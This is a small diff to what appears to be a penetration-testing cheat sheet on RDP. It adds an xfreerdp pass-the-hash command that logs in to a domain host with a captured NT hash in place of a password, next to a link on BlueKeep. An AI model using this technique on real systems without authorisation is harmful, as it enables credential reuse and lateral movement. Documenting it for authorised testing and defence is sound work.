@@ -29,6 +29,11 @@ Domain user
 xfreerdp /d:<domain> /u:<user> /v:<ip> +clipboard
 ```
 
+Domain user (PtH)
+```bash
+xfreerdp /d:<domain> /u:<user> /pth:<nt-hash> /v:<ip> +clipboard
+```
+
 ## Exploits
 
 [BlueKeep - Wikipedia](https://en.wikipedia.org/wiki/BlueKeep)
